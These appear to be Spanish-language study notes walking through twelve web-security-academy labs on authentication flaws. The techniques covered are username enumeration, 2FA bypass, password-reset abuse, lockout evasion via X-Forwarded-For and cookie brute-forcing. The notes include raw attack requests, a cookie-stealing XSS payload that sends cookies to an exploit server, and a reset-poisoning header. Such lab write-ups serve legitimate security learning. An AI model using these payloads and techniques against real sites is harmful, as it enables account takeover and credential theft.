-----
### QUE ES?
Una **Authentication Vulnerability** es un fallo en el mecanismo de autenticación que permite a un atacante hacerse pasar por otro usuario.
Ocurre cuando la aplicación implementa mal el login, la gestión de sesiones o los tokens de autenticación.
Permite cosas como saltarse el inicio de sesión, acceder a cuentas ajenas o escalar privilegios.
Se previene aplicando validaciones robustas, limitando intentos de login, usando MFA y gestionando correctamente las sesiones.
#### PASOS:
- _FUERZA BRUTA DE LOGIN_ 
- _USER ENUMERATION_  `Detectar si la aplicación responde diferente cuando el usuario existe vs cuando no existe.`
- _BRUTE FORCE CON RESPUESTA DIFERENCIAL:_  `Analizar códigos de estado, tiempos de respuesta o mensajes de error distintos.
- _MANIPULACIÓN DE COOKIES:_  
    Modificar cookies como `stay-logged-in`, `remember-me` o `session` para ver si están firmadas o son predecibles.
- _TOKEN PREDECIBLE:_  
    Analizar si los tokens de sesión siguen un patrón (incremental, base64 simple, etc.).
- _BYPASS DE MFA:_  `Probar si puede omitirse cambiando la URL, manipulando parámetros o reutilizando sesión previa.`
- _PASSWORD RESET FLAW:_  `Mirar si el token de recuperación es reutilizable, predecible o no está vinculado al usuario correcto.
- _ACCOUNT LOCK LOGIC FLAW:_  `Ver si se puede evitar el bloqueo alternando usuarios o manipulando parámetros.`
### LAB1: USER ENUMERATION VIA DIFFERENT RESPONSES
En este primer lab vemos un panel de inicio de sesión que al intentar loguearnos nos revela cierta información en los mensajes de error, algo como `Invalid Username`.
Si llevamos la petición al **intruder** y hacemos un *ataque de fuerza bruta* nos damos cuenta de que cuando el usuario es correcto el mensaje cambia. Dee esta manera repetimos el proceso pro con las contraseñas para loguearnos.
### LAB2: 2FA SIMPLE BYPASS
En este laboratorio nos dan las *credenciales* del usuario víctima pero al intentar loguearnos vemos que necesitamos un *código de verificación* el cual se manda a un correo.
podemos tratar de bypasearlo intentando modificar la *url* para ver si realmente usa la autenticación en dos pasos.
Una vez en la pagina para meter el código cambiar la url a `https://LAB-ID.web-security-academy.net/my-account?id=carlos
### LAB3: PASSWORD RESET BROKEN LOGIC
En este laboratorio vemos un apartado para *resetear la contraseña*, si probamos todo el flujo con nuestra cuenta y lo analizamos en el *http history* podemos ver un ultimo `POST` que contiene tanto el *token* como el *usuario* y *contraseña* nuevas. Validamos si el *token* es realmente usado y nos damos cuenta que cambiándolo al mismo valor en body y cabecera podemos sustituir el usuario por otro para cambiarle la contraseña a este.
`POST /forgot-password?temp-forgot-password-token=x HTTP/2
`Host: LAB-ID.web-security-academy.net
`Cookie: session=XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
`
`temp-forgot-password-token=x&username=carlos&new-password-1=pepe&new-password-2=pepe
### LAB4: USER ENUMERATION VIA SUBTLY DIFFERENT RESPONSES
En este laboratorio volvemos a ver que el login nos da información de los errores, podemos tratar de hacer un ataque de fuerza bruta.
Para ver si el mensaje de error cambia podemos seleccionar el mensaje directamente en `Settings` → `Grep - Extract` de esta forma nos aparecerá en cada intento.
El texto solo cambia en el `.` del final.
### LAB5: USERNAME ENUMERATION VIA RESPONSE TIMING
En este lab volvemos a tener un ataque de *fuerza bruta* por login pero esta vez basado en *tiempo* y ademas implementa una medida de seguridad al bloquearnos al realizar varios intentos fallidos. Para *bypasear* el bloqueo podemos usar una cabecera como `X-Forwarded-For:`. También nos damos cuenta que si el usuario es correcto la respuesta es mucho mas lenta que de normal. En el intruder marcando un ataque **Pitchford** vamos a ir iterando tanto el valor de `X-Forwarded-For:` como el del usuario y posteriormente contraseña.
`POST /login HTTP/2
`Host: LAB-ID.web-security-academy.net
`Cookie: session=XXXXXXXXXXXXXXXXXXXXXX
`X-Forwarded-For: 127.0.0.&1&

`username=anaheimt&password=&test&
La cabecera **`X-Forwarded-For`** se usa para indicar la **IP real del cliente** cuando la petición pasa por un proxy, balanceador o CDN.
### LAB6: BROKEN BRUTE-FORCE PROTECTION, IP BLOCK
En este lab vemos un panel de login nos dan ya el usuario de la víctima pero vemos que al intentar loguearnos nos bloquean durante un minuto por intentos fallidos.
Podemos bypasear esto si antes de que nos bloqueen nos logueamos con nuestra cuenta de forma correcta, para hacer esto nos vamos al *Intruder* seteamos un **Pitchfork attack** y vamos a colocar en el usuario una lista de `winer carlos` del largo del payload de contraseñas (las contraseñas deben alternar entre la correcta de wiener y la que vayamos a probar).
Otra cosa importante es crear una *pool* con concurrencia de 1 para controlar el envío de las peticiones
### LAB7: USERNAME ENUMERATION VIA ACCOUNT LOCK
En este lab vemos un panel de login pero detectamos un comportamiento extraño, al hacer un **Cluster Bomb Attack** si para el primer payload le pasamos una *lista de usuarios* ,para el segundo simplemente le enviamos un *string* cualquiera y hacemos que haga 5 intentos (Generate 5) por cada usuario veremos que solo nos bloquea por intentos en un usuario. Esto quiere decir que este es el usuario valido. Probamos a hacer fuerza bruta contra el usuario y nos logueamos.
### LAB8: 2FA BROKEN LOGIC
En este lab vemos un panel de login seguido de *2FA* realizamos con nuestra cuenta todo el proceso y vemos varias cosas extrañas. Vemos una request por `GET` en la cual verifica el usuario mediante un parámetro *verify* (es la que establece que se cree el código *mfa*) y otra request por POST en la cual se envía el código. Lo que podemos probar es modificar el parámetro verify con el usuario Carlos para que se cree el código y después a través del *Intruder* realizar fuerza bruta sobre el código *mfa* a través de la request `POST`. (importante añadir *max integer digits: 4*)
### LAB9: BRUTE-FORCING A STAY-LOGGED-IN COOKIE
En este lab nos encontramos con un *login* que tiene para setear una *cookie stay logged in*. Si seguimos todo el flujo con nuestro usuario y el *stay-logged-in* seteado veremos una request por `GET /my-account?id=` y con una cookie *stay-logged-in* la cual si la examinamos nos damos cuenta que tiene esta estructura `wiener:51dc30ddc473d43a6011e9ebba6ca770` (usuario:MD5 de la contraseña). Podemos probar a realizar un ataque desde el Intruder seteando payload processing de la siguiente manera:
- `Hash: MD5
- `Add prefix: wiener:
- `Encode: Base64-encode
### LAB10: OFLINE PASSWORD CRACKING
En este lab nos volvemos a encontrar con la cookie de *stay-logged-in* pero esta vez al seguir todo el flujo con el *Http History* no vemos nada raro. Lo que si encontramos es un **XSS** en los post permitiéndonos crear un post malicioso para que al hacer click otro usuario lo redirija al exploit server y le veamos la cookie *stay-logged-in* que al decodearla contiene el usuario y la contraseña en *MD5*. Crackearla de forma offline.
`<script>document.location='//EXPLOIT-SERVER-ID.exploit-server.net/'+document.cookie</script>
### LAB11: PASSWORD RESET POISONING VIA MIDDLEWARE
En este lab nos encontramos con un login que permite cambiar la contraseña en caso de que la hayas olvidado. Si seguimos toda la traza con el *Http History* veremos una request `POST /forgot-password` la cual permite que le añadamos la cabecera `X-Forwarded-Host: EXPLOIT-SERVER-ID.exploit-server.net`. Al enviarla con el usuario como Carlos nos llegara a los logs del exploit server la petición con la cookie *stay-logged-in* solo tenemos que copiarla y usar este valor en la url que te lleva al cambio de contraseña.
La cabecera **`X-Forwarded-Host`** se usa para indicar el **host original solicitado por el cliente** cuando la petición pasa por un proxy o balanceador.
### LAB12: PASSWORD BRUTE-FORCE VIA PASSWORD CHANGE
En este lab nos encontramos que podemos modificar nuestra contraseña, si interceptamos esto con burpsuite podemos cambiar el usuario por Carlos y probar fuerza bruta para ver si nos sale el mensaje de que la nueva contraseña no coincide. La idea es que al hacer fuerza bruta contra la contraseña real que no conocemos todo el rato nos va a salir contraseña incorrecta pero si nos llega a salir que las contraseñas nuevas no coinciden significa que hemos encontrado la contraseña actual.
`username=carlos&current-password=§incorrect-password§&new-password-1=123&new-password-2=abc
Para que nos avise de si esto sucede podemos irnos a *Settings* → *Grep - Mach* y añadir `New passwords do not match` 